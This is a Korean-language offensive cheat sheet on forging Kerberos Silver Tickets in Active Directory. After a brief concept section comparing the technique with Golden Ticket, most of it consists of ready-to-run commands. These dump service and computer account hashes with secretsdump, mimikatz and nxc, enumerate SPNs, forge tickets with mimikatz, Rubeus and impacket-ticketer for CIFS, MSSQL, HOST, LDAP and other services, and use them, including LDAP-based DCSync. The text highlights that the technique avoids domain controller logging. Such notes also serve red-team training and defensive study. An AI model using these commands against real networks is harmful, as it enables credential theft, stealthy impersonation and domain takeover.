# 02_Silver_Ticket

# AD DC장악 — Silver Ticket

---

## 개념

Silver Ticket은 서비스 계정 또는 컴퓨터 계정의 NTLM 해시로 특정 서비스에 대한 TGS(서비스 티켓)를 직접 위조하는 공격이다. Golden Ticket이 TGT를 위조해 KDC에 제출하고 실제 TGS를 발급받는 방식인 반면, Silver Ticket은 TGS 자체를 위조해 해당 서비스에 직접 제출한다.

핵심 차이점은 DC와 통신하지 않는다는 것이다. TGS 요청이 KDC를 거치지 않기 때문에 DC의 이벤트 로그에 TGS 요청 기록이 남지 않는다. 탐지 측면에서 Golden Ticket보다 훨씬 어렵다.

Silver Ticket의 한계는 적용 범위가 특정 서비스 하나에 국한된다는 점이다. CIFS 서비스의 Silver Ticket으로는 파일 공유에만 접근할 수 있고 다른 서비스에는 사용할 수 없다. 그러나 서비스 계정이나 컴퓨터 계정 해시만 있으면 되고, DA 권한은 필요하지 않아 횡적 이동(lateral movement)에 유용하다.

Golden Ticket vs Silver Ticket 요약:

```
              Golden Ticket         Silver Ticket
필요 해시     krbtgt NTLM           서비스/컴퓨터 계정 NTLM
적용 범위     도메인 전체            특정 서비스만
DC 통신       있음 (TGS 요청 시)    없음
탐지 난이도   어려움                 매우 어려움
위조 대상     TGT                   TGS
```

---

## 서비스 계정 해시 획득

```bash
# DCSync (DA 권한 있을 때)
impacket-secretsdump \
  -just-dc-user svc_sql \
  corp.local/Administrator:'Password1!'@<DC_IP>

# 전체 덤프 후 특정 계정 grep
impacket-secretsdump \
  corp.local/Administrator:'Password1!'@<DC_IP> \
  | grep -E "svc_|sql|mssql"

# 컴퓨터 계정 해시 (DC 자체 서비스 접근 시 필요)
impacket-secretsdump \
  corp.local/Administrator:'Password1!'@<DC_IP> \
  | grep "DC\$\|SERVER01\$"

# nxc로 SAM 덤프 (로컬 관리자 권한 있을 때)
nxc smb <서버 IP> -u administrator -H <NTLM> --sam

# mimikatz에서
sekurlsa::logonpasswords    # 현재 로그온된 서비스 계정
lsadump::dcsync /domain:corp.local /user:svc_sql
```

---

## 대상 서비스 SPN 확인

Silver Ticket 생성 전에 타겟 서버의 SPN을 정확히 파악해야 한다.

```bash
# 특정 서버의 SPN 확인
impacket-GetUserSPNs corp.local/john:'Password1!' -dc-ip <DC_IP> | grep -i sql

# ldapsearch로 SPN 열거
ldapsearch -x -H ldap://<DC_IP> -D "corp\john" -w 'Password1!' \
  -b "DC=corp,DC=local" \
  "(servicePrincipalName=*)" \
  servicePrincipalName sAMAccountName
```

```powershell
# PowerView
Get-DomainComputer -Properties name, serviceprincipalname | `
  Where-Object {$_.serviceprincipalname -ne $null}

# setspn (기본 내장)
setspn -Q */* | findstr <서버명>
```

---

## mimikatz (Windows)

mimikatz의 Silver Ticket은 `kerberos::golden` 모듈을 사용하지만 `/service`와 `/target` 옵션으로 Silver Ticket임을 명시한다.

```bash
:: CIFS — 파일 공유 접근
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /target:server01.corp.local ^
  /service:CIFS ^
  /rc4:<서비스계정_NTLM> /ptt

:: AES256 사용 (더 스텔스)
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /target:server01.corp.local ^
  /service:CIFS ^
  /rc4:<서비스계정_NTLM> ^
  /aes256:<서비스계정_AES256> /ptt

:: HTTP — WinRM, 웹 서비스
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /target:server01.corp.local ^
  /service:HTTP ^
  /rc4:<서비스계정_NTLM> /ptt

:: MSSQLSvc — SQL Server
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /target:sql01.corp.local ^
  /service:MSSQLSvc ^
  /rc4:<서비스계정_NTLM> /ptt

:: HOST — 원격 셸, 작업 스케줄러
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /target:server01.corp.local ^
  /service:HOST ^
  /rc4:<컴퓨터계정_NTLM> /ptt

:: LDAP — DC의 LDAP 접근 (DCSync 가능)
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /target:dc.corp.local ^
  /service:LDAP ^
  /rc4:<DC_컴퓨터계정_NTLM> /ptt

:: RPCSS — WMI
kerberos::golden /user:Administrator /domain:corp.local ^
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX ^
  /target:server01.corp.local ^
  /service:RPCSS ^
  /rc4:<컴퓨터계정_NTLM> /ptt

:: HOST + RPCSS 조합 (원격 WMI 실행)
:: HOST 먼저 주입 후 RPCSS 주입

:: 생성 후 확인 및 테스트
klist
dir \\server01.corp.local\c$          :: CIFS 확인
```

---

## Rubeus (Windows)

```powershell
:: CIFS Silver Ticket
.\Rubeus.exe silver /rc4:<서비스계정_NTLM> /domain:corp.local `
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX `
  /user:Administrator `
  /target:server01.corp.local `
  /service:CIFS /ptt /nowrap

:: AES256 사용
.\Rubeus.exe silver /aes256:<서비스계정_AES256> /domain:corp.local `
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX `
  /user:Administrator `
  /target:server01.corp.local `
  /service:CIFS /ptt /nowrap

:: MSSQLSvc
.\Rubeus.exe silver /rc4:<서비스계정_NTLM> /domain:corp.local `
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX `
  /user:Administrator `
  /target:sql01.corp.local `
  /service:MSSQLSvc /ptt /nowrap

:: LDAP (LDAP 접근용)
.\Rubeus.exe silver /rc4:<DC_컴퓨터계정_NTLM> /domain:corp.local `
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX `
  /user:Administrator `
  /target:dc.corp.local `
  /service:LDAP /ptt /nowrap
```

---

## impacket (Linux)

```bash
# CIFS Silver Ticket — ccache 생성
impacket-ticketer \
  -nthash <서비스계정_NTLM> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain corp.local \
  -spn CIFS/server01.corp.local \
  Administrator
# -> Administrator.ccache

# AES256
impacket-ticketer \
  -aesKey <서비스계정_AES256> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain corp.local \
  -spn CIFS/server01.corp.local \
  Administrator

# MSSQLSvc
impacket-ticketer \
  -nthash <서비스계정_NTLM> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 \
  Administrator

# LDAP (DC의 LDAP 접근)
impacket-ticketer \
  -nthash <DC_컴퓨터계정_NTLM> \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -domain corp.local \
  -spn LDAP/dc.corp.local \
  Administrator

# /etc/hosts 등록
echo "<서버_IP>  server01.corp.local" >> /etc/hosts

# 환경변수 설정 후 접근
export KRB5CCNAME=Administrator.ccache

# CIFS 접근
impacket-smbclient -k -no-pass administrator@server01.corp.local

# SQL 접근
impacket-mssqlclient -k -no-pass administrator@sql01.corp.local

# LDAP 기반 DCSync
impacket-secretsdump -k -no-pass -just-dc corp.local/administrator@dc.corp.local
```

---

## 주요 SPN 서비스 이름 목록

```
CIFS        파일 공유 (\\server\share 접근)
HTTP        웹 서비스, WinRM (5985/5986)
LDAP        LDAP 쿼리 (DC의 LDAP 서비스 -> DCSync 가능)
HOST        원격 셸, 작업 스케줄러, SCM 등
RPCSS       WMI (원격 명령 실행)
MSSQLSvc    SQL Server (인스턴스:포트 포함)
wsman       WinRM (PowerShell Remoting)
GC          Global Catalog (DC의 글로벌 카탈로그)
DNS         DNS 서비스
FTP         FTP 서비스

컴퓨터 계정 해시로 접근 가능한 SPN:
HOST, CIFS, RPCSS, LDAP 등 해당 컴퓨터의 모든 서비스
```

---

## 흐름

서비스 계정 / 컴퓨터 계정 해시 획득 → 도메인 SID 확인 → 타겟 서비스 SPN 정확히 확인 → /etc/hosts에 FQDN 등록 → ticketer로 Silver Ticket 생성 → KRB5CCNAME 설정 → 해당 서비스 직접 접근